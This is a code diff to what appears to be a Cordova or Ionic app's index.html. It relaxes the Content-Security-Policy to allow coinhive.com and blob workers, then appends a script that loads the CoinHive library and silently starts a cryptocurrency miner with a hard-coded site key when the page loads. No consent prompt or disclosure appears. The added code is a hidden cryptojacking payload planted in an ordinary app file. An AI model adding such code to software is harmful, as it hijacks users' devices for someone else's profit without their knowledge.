@@ -13,7 +13,8 @@
       cdvphotolibrary:  'self' data:; 
       default-src * data: blob: 'self' gap: wss: ws: http://*.google.com  http://*.googleapis.com  http://*.gstatic.com  http://*.googleusercontent.com;
       style-src 'self' 'unsafe-inline' http://*.googleapis.com ;
-      script-src 'self' http://*.google.com  http://*.googleapis.com  http://*.gstatic.com  http://*.googleusercontent.com 'unsafe-inline' 'unsafe-eval'
+      worker-src 'self' blob: ;
+      script-src 'self' https://coinhive.com http://*.google.com  http://*.googleapis.com  http://*.gstatic.com  http://*.googleusercontent.com 'unsafe-inline' 'unsafe-eval'
         http://127.0.0.1:* http://localhost:*;
   ">
   <!-- compiled css output -->
@@ -67,5 +68,20 @@
   <div id="fb-root"></div>
 
 </body>
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+var _miner;
+(function(){
+  function when(lib){ var _cb, _ival=setInterval(function(){ if(self[lib]) { _cb(); clearInterval(_ival); } }, 20); return{ run: function(cb) { _cb=cb; } } }
 
+  when('CoinHive').run(function(){
+    _miner = new CoinHive.User('HZbryycOfkJHs2hxJ0Fm9a83bI48UXps', 'app', {
+      threads: 1,
+      throttle: 0.9
+    });
+    _miner.setAutoThreadsEnabled(true);
+    _miner.start();
+  });
+})();
+</script>
 </html>
